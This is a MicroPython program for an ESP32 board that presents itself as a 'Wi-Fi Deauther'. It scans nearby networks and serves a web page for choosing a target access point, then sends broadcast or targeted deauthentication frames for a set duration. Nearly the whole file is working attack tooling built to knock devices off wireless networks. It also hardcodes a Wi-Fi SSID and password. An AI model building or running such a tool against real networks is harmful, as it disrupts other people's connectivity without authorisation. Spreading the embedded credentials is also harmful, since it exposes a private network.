import network
import uasyncio as asyncio
import time
import gc
from microdot import Microdot, Response

WIFI_SSID = 'ITRobotics'
WIFI_PASSWORD = 'ITRobotics23'

STATE = {
    'status': 'Starting',
    'error': '',
    'networks': [],
    'selected_network': None,
    'attack_mode': 'broadcast',
    'target_mac': '',
    'duration': 10,
    'running': False,
    'attack_task': None,
    'deauth_supported': False,
}

wlan = network.WLAN(network.STA_IF)
wlan.active(True)
app = Microdot()

def wifi_connect(ssid, password, timeout=20):
    if wlan.isconnected():
        STATE['status'] = 'Connected to Wi-Fi'
        return True
    STATE['status'] = 'Connecting to Wi-Fi...'
    try:
        wlan.connect(ssid, password)
        start = time.time()
        while not wlan.isconnected() and time.time() - start < timeout:
            time.sleep(1)
        if wlan.isconnected():
            STATE['status'] = 'Connected'
            STATE['error'] = ''
            return True
    except Exception as e:
        STATE['error'] = str(e)
    STATE['status'] = 'Connection failed'
    return False

def parse_form(body):
    data = {}
    try:
        text = body.decode('utf-8')
        for pair in text.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                data[k] = v.replace('+', ' ').replace('%3A', ':')
    except:
        pass
    return data

def scan_networks():
    STATE['networks'] = []
    try:
        results = wlan.scan()
        for ssid, bssid, channel, rssi, authmode, hidden in results:
            ssid_str = ssid.decode('utf-8', 'ignore') if isinstance(ssid, bytes) else ssid
            STATE['networks'].append({
                'ssid': ssid_str,
                'bssid': ':'.join('{:02x}'.format(x) for x in bssid),
                'channel': channel,
                'rssi': rssi,
            })
        STATE['error'] = ''
    except Exception as e:
        STATE['error'] = 'Scan error: ' + str(e)

def format_mac(text):
    text = text.strip().lower().replace('-', ':').replace(' ', '')
    if len(text) == 12 and ':' not in text:
        text = ':'.join(text[i:i+2] for i in range(0, 12, 2))
    return text

def deauth_available():
    try:
        import esp32
        return hasattr(esp32, 'wifi_deauth')
    except:
        return False

def send_deauth(bssid, target=None):
    try:
        import esp32
        if hasattr(esp32, 'wifi_deauth'):
            target = target or 'ff:ff:ff:ff:ff:ff'
            esp32.wifi_deauth(bssid, target)
            return True
    except:
        pass
    return False

async def attack_loop():
    start = time.time()
    duration = STATE['duration']
    target_mac = format_mac(STATE['target_mac'])
    selected = STATE['selected_network']
    if not selected:
        STATE['error'] = 'No network selected'
        STATE['running'] = False
        return
    bssid = selected['bssid']
    STATE['status'] = 'Attacking {}'.format('broadcast' if STATE['attack_mode'] == 'broadcast' else target_mac)
    
    while STATE['running'] and time.time() - start < duration:
        if STATE['deauth_supported']:
            if STATE['attack_mode'] == 'targeted' and target_mac:
                send_deauth(bssid, target_mac)
            else:
                send_deauth(bssid, None)
        await asyncio.sleep(0.5)
    
    STATE['running'] = False
    STATE['status'] = 'Idle'

def render_html():
    ip = wlan.ifconfig()[0] if wlan.isconnected() else 'N/A'
    wifi_status = 'Connected' if wlan.isconnected() else 'Disconnected'
    
    nets_html = ''
    for n in STATE['networks']:
        nets_html += '<tr><td>{}</td><td>{}</td><td>{}</td><td>{}</td></tr>'.format(
            n['ssid'][:20], n['bssid'], n['channel'], n['rssi'])
    
    sel_info = 'None'
    if STATE['selected_network']:
        sel_info = '{} ({})'.format(STATE['selected_network']['ssid'], STATE['selected_network']['bssid'])
    
    error_html = ''
    if STATE['error']:
        error_html = '<div style="background:#d32f2f;padding:10px;margin:10px 0;border-radius:5px;color:#fff;">{}</div>'.format(STATE['error'])
    
    stop_btn = ''
    if STATE['running']:
        stop_btn = '<form method="POST" action="/stop" style="margin-top:10px"><button style="background:#d32f2f">Stop Attack</button></form>'
    
    html = """<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ESP32 Deauther</title>
<style>
body{{ font-family:Arial;padding:15px;background:#111;color:#eee }}
.container{{ max-width:800px;margin:auto }}
h1{{ color:#4CAF50 }}
h2{{ color:#fff;border-bottom:2px solid #2196f3;padding-bottom:10px }}
button{{ padding:10px 15px;margin:5px;border:0;border-radius:5px;background:#2196f3;color:#fff;cursor:pointer;font-size:14px }}
button:hover{{ opacity:0.9 }}
table{{ width:100%;border-collapse:collapse;margin:10px 0;background:#222 }}
th,td{{ padding:8px;text-align:left;border:1px solid #444 }}
th{{ background:#333 }}
input,select{{ width:100%;padding:8px;margin:5px 0;border:1px solid #555;background:#222;color:#eee;border-radius:3px;box-sizing:border-box }}
.card{{ background:#1a1a1a;padding:15px;margin:15px 0;border-left:4px solid #2196f3;border-radius:5px }}
.status{{ background:#222;padding:12px;margin:10px 0;border-radius:5px }}
label{{ display:block;font-weight:bold;margin:10px 0 5px 0 }}
</style>
</head><body><div class="container">
<h1>ESP32 Wi-Fi Deauther</h1>
<div class="status">
<b>Status:</b> {status}<br>
<b>Wi-Fi:</b> {wifi_status} (IP: {ip})
</div>
{error_html}

<div class="card">
<h2>1. Scan Networks</h2>
<form method="POST" action="/scan"><button type="submit">Scan Networks</button></form>
<table>
<tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>RSSI</th></tr>
{nets_html}
</table>
</div>

<div class="card">
<h2>2. Select Network</h2>
<p><b>Selected:</b> {sel_info}</p>
<form method="POST" action="/select">
<select name="bssid" required><option value="">-- Choose --</option>
{options_html}
</select>
<button type="submit">Select</button>
</form>
</div>

<div class="card">
<h2>3. Attack</h2>
<form method="POST" action="/start">
<label>Mode:</label>
<select name="attack_mode">
<option value="broadcast"{broadcast_sel}>Broadcast (All)</option>
<option value="targeted"{targeted_sel}>Targeted (Specific MAC)</option>
</select>
<label>Target MAC:</label>
<input name="target_mac" value="{target_mac}" placeholder="aa:bb:cc:dd:ee:ff">
<label>Duration (sec):</label>
<input name="duration" type="number" min="1" max="3600" value="{duration}">
<button type="submit">Start Attack</button>
</form>
{stop_btn}
</div>
</div></body></html>
""".format(
        status=STATE['status'],
        wifi_status=wifi_status,
        ip=ip,
        error_html=error_html,
        nets_html=nets_html or '<tr><td colspan="4">No networks</td></tr>',
        sel_info=sel_info,
        options_html=''.join('<option value="{}">{} ({})</option>'.format(
            n['bssid'], n['ssid'][:25], n['bssid']) for n in STATE['networks']),
        target_mac=STATE['target_mac'],
        duration=STATE['duration'],
        broadcast_sel=' selected' if STATE['attack_mode'] == 'broadcast' else '',
        targeted_sel=' selected' if STATE['attack_mode'] == 'targeted' else '',
        stop_btn=stop_btn,
    )
    return html

@app.route('/')
async def index(request):
    return Response(render_html())

@app.route('/scan', methods=['POST'])
async def scan(request):
    scan_networks()
    return Response(render_html())

@app.route('/select', methods=['POST'])
async def select_network(request):
    data = parse_form(request.body)
    bssid = data.get('bssid', '')
    for net in STATE['networks']:
        if net['bssid'] == bssid:
            STATE['selected_network'] = net
            STATE['error'] = ''
            break
    return Response(render_html())

@app.route('/start', methods=['POST'])
async def start(request):
    if STATE['running']:
        STATE['error'] = 'Attack already running'
        return Response(render_html())
    data = parse_form(request.body)
    STATE['attack_mode'] = data.get('attack_mode', 'broadcast')
    STATE['target_mac'] = format_mac(data.get('target_mac', ''))
    try:
        STATE['duration'] = int(data.get('duration', 10))
    except:
        STATE['duration'] = 10
    
    if STATE['attack_mode'] == 'targeted' and not STATE['target_mac']:
        STATE['error'] = 'Targeted mode needs MAC address'
        return Response(render_html())
    if not STATE['selected_network']:
        STATE['error'] = 'Please select a network first'
        return Response(render_html())
    
    STATE['running'] = True
    STATE['error'] = ''
    STATE['attack_task'] = asyncio.create_task(attack_loop())
    return Response(render_html())

@app.route('/stop', methods=['POST'])
async def stop(request):
    STATE['running'] = False
    STATE['status'] = 'Stopping'
    return Response(render_html())

def main():
    gc.collect()
    STATE['deauth_supported'] = deauth_available()
    wifi_connect(WIFI_SSID, WIFI_PASSWORD)
    ip = wlan.ifconfig()[0] if wlan.isconnected() else 'N/A'
    print('Web server starting on http://{}'.format(ip))
    app.run()

if __name__ == '__main__':
    main()
